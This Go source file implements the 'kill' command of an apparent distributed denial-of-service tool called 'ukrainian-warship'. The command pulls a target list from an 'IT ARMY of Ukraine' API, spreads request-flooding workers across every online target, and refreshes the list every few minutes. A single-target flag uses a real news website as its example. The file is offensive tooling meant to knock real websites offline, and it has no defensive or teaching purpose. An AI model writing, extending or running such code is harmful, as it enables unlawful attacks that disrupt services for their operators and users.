/*
Copyright © 2022 NAME HERE <EMAIL ADDRESS>

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package cmd

import (
	"fmt"
	"time"

	"github.com/seedpockets/ukrainian-warship/pkg/stresstest"

	"github.com/seedpockets/ukrainian-warship/pkg/api_client"

	"github.com/spf13/cobra"
)

// killCmd represents the kill command
var killCmd = &cobra.Command{
	Use:   "kill",
	Short: "Run automatic attack",
	Long: `Fetches IT ARMY of Ukraine targets(from official api) and attacks. 

Periodically updates target list and evenly spreads load among online
targets.

Default worker amount is 24 divided by number of targets.`,
	Run: func(cmd *cobra.Command, args []string) {
		singleTarget, _ := cmd.Flags().GetString("target")
		debug, _ := cmd.Flags().GetBool("debug")
		workers, _ := cmd.Flags().GetInt("workers")
		refreshRate, _ := cmd.Flags().GetFloat64("refresh")
		if singleTarget != "" {
			err := KillSingleTarget(singleTarget, debug)
			if err != nil {
				panic(err.Error())
			}
		} else {
			KillAll(workers, refreshRate, debug)
		}
	},
}

func init() {
	rootCmd.AddCommand(killCmd)
	killCmd.Flags().Int("workers", 64, "--workers=1024 ")
	killCmd.Flags().String("target", "", "--target=https://ww.rt.com takes aim at a single target")
	killCmd.Flags().Float64("refresh", 5, "--refresh=10 number of minutes between refreshing target URLs")
	killCmd.Flags().Bool("debug", false, "--debug=true defaults to false")
}

func KillSingleTarget(target string, debug bool) error {
	warship, err := stresstest.New(target, debug, 0)
	if err != nil {
		return err
	}
	warship.FocusFire()
	return nil
}

func KillAll(workers int, refreshRate float64, debug bool) {
	var refreshTimeMinutes = time.Duration(refreshRate)
	refreshTime := time.Now().Add(time.Minute * refreshTimeMinutes).Unix() // refresh targets interval
	running := true
	warships := []*stresstest.Warship{}
	var totalRequests int64 = 0
	for running {
		if len(warships) <= 0 {
			targets, err := getTargets()
			if err != nil {
				fmt.Println("Could not get targets")
				panic(err.Error())
			}
			var w = workers / len(targets.Online)
			for i := 0; i < len(targets.Online); i++ {
				warship, err := stresstest.New(targets.Online[i], debug, w)
				if err != nil {
					fmt.Println("Failed to start Warship: ", targets.Online[i])
				}
				warship.Fire()
				warships = append(warships, warship)
			}
		}
		clearScreen()
		fmt.Println(string(colorGreen) + "Updates targets every " + refreshTimeMinutes.String() + " min..." + string(colorReset))
		fmt.Println("Request\t\tSuccess\t\tTarget")
		fmt.Println("__________________________________________________________________")
		for _, v := range warships {
			fmt.Println(v)
			totalRequests += v.AmountRequests
		}
		fmt.Printf("Total Request: %d", totalRequests)
		if time.Now().Unix() > refreshTime {
			fmt.Println("Refreshing targets!")
			warships = []*stresstest.Warship{}
			refreshTime = time.Now().Add(time.Minute * refreshTimeMinutes).Unix()
		}
		time.Sleep(time.Millisecond * 500)
	}
}

func getTargets() (*api_client.Targets, error) {
	clearScreen()
	fmt.Println("Acquiring targets...")
	targets, err := api_client.GetTargets()
	if err != nil {
		return nil, err
	}
	fmt.Println("Done...")
	return targets, nil
}

func clearScreen() {
	fmt.Printf("\x1b[2J")
}
